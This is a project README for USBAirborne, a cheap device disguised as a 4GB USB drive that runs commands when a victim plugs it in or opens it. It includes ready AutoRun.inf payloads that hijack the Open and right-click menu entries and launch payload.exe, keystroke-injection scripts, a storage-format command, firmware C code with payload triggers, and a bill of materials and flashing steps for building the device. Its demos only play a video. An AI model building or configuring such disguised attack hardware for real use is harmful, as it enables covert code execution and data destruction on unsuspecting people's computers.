# USBAirborne

An Advanced BadUSB

------

 [**English**](https://github.com/Push3AX/USBAirborne/blob/main/readme.md)|[中文](https://github.com/Push3AX/USBAirborne/blob/main/readme_cn.md)

USBAirborne masquerades as a USB drive, but when the victim plugs it into computer, it executes specified commands or programs.

- Supports BadUSB and AutoRun attacks.
- Built-in 4MB storage, disguised as a 4GB USB drive.
- Approximately 2 USD/unit.
- Standard G2 board, easily concealed within conventional USB cases.

<img src="https://raw.githubusercontent.com/Push3AX/USBAirborne/main/images/1.png" style="zoom: 50%;" />



## Demo

USBAirborne comes with a demo:

After being plugged into a computer, USBAirborne appears as a 4GB USB drive.

However, when the victim open the USB drive (including double-clicking, right-clicking - Open, or Open in new window), USBAirborne will automatically open the browser to play "Never Gonna Give You Up".

<img src="https://raw.githubusercontent.com/Push3AX/USBAirborne/main/images/autorun.gif"/>

The USBAirborne's attack scripts are written in the Autorun.inf under the root directory.

The Autorun.inf used here is as follows:

```ini
[AutoRun]
autoplay=true

; Disguise the drive icon as a USB drive icon
icon=c:\windows\system32\shell32.dll,79

; Drive name
label=Nothing inside

; Attack Payload, in this case, launching a webpage via cmd
open=cmd.exe /c "start https://www.bilibili.com/video/BV1uT4y1P7CX"
run=cmd.exe /c "start https://www.bilibili.com/video/BV1uT4y1P7CX"

; Overwrites the right-click context menu
shell\open=Open
shell\open\Command=cmd.exe /c "start https://www.bilibili.com/video/BV1uT4y1P7CX" 
shell\opennewwindow=Open in new window
shell\opennewwindow\Command=cmd.exe /c "start https://www.bilibili.com/video/BV1uT4y1P7CX"
```



## Execute Specified Programs

USBAirborne can also be configured to perform other actions, such as executing a specified program.

To begin with, turn on the switch1 of USBAirborne to deactivating the attack mode.

**Only when the attack mode is off can files be written to the root directory of USBAirborne. Also, when the attack mode is off, USBAirborne will not execute any attack scripts.**

<img src="https://raw.githubusercontent.com/Push3AX/USBAirborne/main/images/Switch_en.png"/>

Modifying the Autorun.inf in the root directory of USBAirborne can achieve other attack behaviors. For example, to run payload.exe in the root directory:

```ini
[AutoRun]
autoplay=true

; Disguise the drive icon as a USB drive icon
icon=c:\windows\system32\shell32.dll,79

; Drive name
label=Nothing inside

; Attack Payload, in this case, run payload.exe in the root directory
open=payload.exe
run=payload.exe

; Overwrites the right-click context menu
shell\open=Open
shell\open\Command=payload.exe
shell\opennewwindow=Open in new window
shell\opennewwindow\Command=payload.exe
```

<img src="https://raw.githubusercontent.com/Push3AX/USBAirborne/main/images/payload.gif"/>



## BadUSB

AutoRun attacks require the victim to interaction with the USB drive. For a more automated approach, BadUSB can be used. It work by simulating keystrokes to execute commands.

(Note that BadUSB is susceptible to various conditions, such as when the screen is locked the BadUSB attack will fail.)

Add two [BadUSB] sections in Autorun.inf file to detail the keystroke sequences. Here is a simple example:

```ini
[BadUSB]
[Win+R]
[Delay][Delay]
notepad[Enter]
[Delay]
Hi![Enter]
This is a test of USBAirborne[Enter]
[Win+R]
[Delay]
[Delay]
https://www.bilibili.com/video/BV1uT4y1P7CX/
[Enter]
[BadUSB]

; The following is the configuration for the AutoRun attack. USBAirborne supports conducting both attacks simultaneously.
[AutoRun]
autoplay=true

; Disguise the drive icon as a USB drive icon
icon=c:\windows\system32\shell32.dll,79

; Drive name
label=Nothing inside

; Attack Payload, here it is to call cmd to open a webpage
open=cmd.exe /c "start https://www.bilibili.com/video/BV1uT4y1P7CX"
run=cmd.exe /c "start https://www.bilibili.com/video/BV1uT4y1P7CX"

; Hijack the right-click menu
shell\open=Open
shell\open\Command=cmd.exe /c "start https://www.bilibili.com/video/BV1uT4y1P7CX" 
shell\opennewwindow=Open in new window
shell\opennewwindow\Command=cmd.exe /c "start https://www.bilibili.com/video/BV1uT4y1P7CX"
```

<img src="https://raw.githubusercontent.com/Push3AX/USBAirborne/main/images/badusb.gif"/>



## OS Compatibility

- AutoRun attacks only support the Windows system and require AutoRun to not be completely disabled. (From Windows 7, AutoRun is disabled by default for most devices while permitting it for DRIVE_FIXED CD-ROM devices. Refer to the related registry items on [Wikipedia](https://en.wikipedia.org/wiki/AutoRun#Registry_settings).)
- BadUSB attacks are theoretically viable across all operating systems. However, the keyboard input for different operating systems is not the same. For example, using Win+R to open the "Run" window is only available on Windows.



## Advanced Utilization

### Advanced Commands for BadUSB

The configuration file for BadUSB supports some combination keys and advanced commands:

1. [Enter]: Press the Enter key.
2. [Shift]: Press the Shift key.
3. [Capslock]: Toggle Caps Lock.
4. [Win]: Press the Windows key.
5. [Win+R]: Open the "Run" window.
6. [Alt+F4]: Close the current window.
7. [Win+D]: Show the desktop.
8. [Win+L]: Lock the computer.
9. [Win+E]: Open Windows Explorer.
10. [Ctrl+Alt+Del]: Open security options.
11. [Delay]: Wait for 500 milliseconds.
12. [Format]: Format storage.

### Compiling Firmware

The firmware source code for USBAirborne is under the USBAirborne.uvproj folder.

To compile, you need the Keil environment. After installing Keil, open [WCHISPTool](https://www.wch.cn/download/WCHISPTool_Setup_exe.html), and click on "Function - Add WCH MCU Database to keil".

![Keil](https://raw.githubusercontent.com/Push3AX/USBAirborne/main/images/keil_en.png)

After that, Using Keil to open the Project.uvproj in the USBAirborne.uvproj folder and compile  firmware.

### Accelerating BadUSB Execution

When executing BadUSB, USBAirborne needs about 4 seconds to read the Payload from Flash. If you wish to execute BadUSB more quickly, you can do so by embedding the Payload directly into the firmware.

In main.c, the BadUSBDemo() function is an example of a Payload. By changing ExecBadUSB to 1, this Payload will be executed.

```c
UINT8 ExecBadUSB = 1;

void BadUSBDemo()
{
	UINT8 Payload[]="https://www.bilibili.com/video/BV1uT4y1P7CX\n";
	mDelaymS(1000);
	mDelaymS(500);
	SendKey(KB_LeftGUI, KB_R);
	mDelaymS(500);
	SendString(Payload,sizeof(Payload)/sizeof(Payload[0]));
	mDelaymS(500);
}

void main(void)
{
	...
	while(1)
	{
		if(ExecBadUSB == 1 && AttackEnabled == 1)
		{
			ExecBadUSB=0;
			BadUSBDemo();
		}
		mDelaymS(100);
	}
	...
}
```

### Alternative Timing for BadUSB Execution

BadUSB typically executes immediately after USBAirborne is plugged into a computer. If you wish to trigger it at a different time, you can do so by setting ExecBadUSB to 1 in different UFI commands.

For example, in USB.c's UFI_staStoUnit() function, setting ExecBadUSB to 1 will execute the BadUSB Payload when USBAirborne is ejected:

```c
void  UFI_staStoUnit(void)
{
	CH375BULKDOWN = 0;
	CH375BULKUP = 0;
	BcswStatus = 0;
	mSenseKey = 0;
	mASC = 0;
	ExecBadUSB=1; //add this
}
```



## Manufacturing Guide

### Hardware Design

The hardware design of USBAirborne is open-sourced on OSHWHUB:

https://oshwhub.com/PushEAX/3079905e2c434c54902d77ab60f6c747

### Bill of Materials

| Component ID | Description     | Package Type        | Quantity |
| ------------ | --------------- | ------------------- | -------- |
| C1,C4        | 10uF Capacitor  | C0603               | 2        |
| C2,C3        | 100nF Capacitor | C0603               | 2        |
| R1,R2        | 22k Resistor    | R0603               | 2        |
| SW1          | 2Pin Switch     |                     | 1        |
| U1           | CH552G          | SOP-16_L10.0-W3.9   | 1        |
| U2           | P25Q32H-SSH-IT  | SOIC-8_L4.9-W3.9    | 1        |
| USB1         | USB2.0-A Male   | USB-A-TH_USB-A-F-90 | 1        |

*Note: CH552G can be replaced with CH551G or CH554G. P25Q32H can be replaced with other W25Q compatible SPI Flash, recommended capacity is between 4MB-16MB.*

### Manufacturing Steps

Here are a brief steps to make your own USBAirborne:

1. Download the [Gerber](https://raw.githubusercontent.com/Push3AX/USBAirborne/main/Hardware/Gerber_PCB1_2022-06-19.zip) file for USBAirborne and send it to a PCB manufacturer for production.
2. Refer to the BOM section and solder the components.
3. Turn on the switch2 of USBAirborne to enter the programming mode.

![switch](https://raw.githubusercontent.com/Push3AX/USBAirborne/main/images/Switch_en.png)

4. Download the firmware for USBAirborne [here](https://raw.githubusercontent.com/Push3AX/USBAirborne/main/USBAirborne.uvproj/USBAirborne_2.1.hex). Use [WCHISPTool](https://www.wch.cn/download/WCHISPTool_Setup_exe.html) to flash the firmware.

![WCHISPTool](https://raw.githubusercontent.com/Push3AX/USBAirborne/main/images/WCHISPTool_en.png)

5. Turn off the switch2, and turn on the switch 1.Copy Autorun.inf to the root directory of USBAirborne.

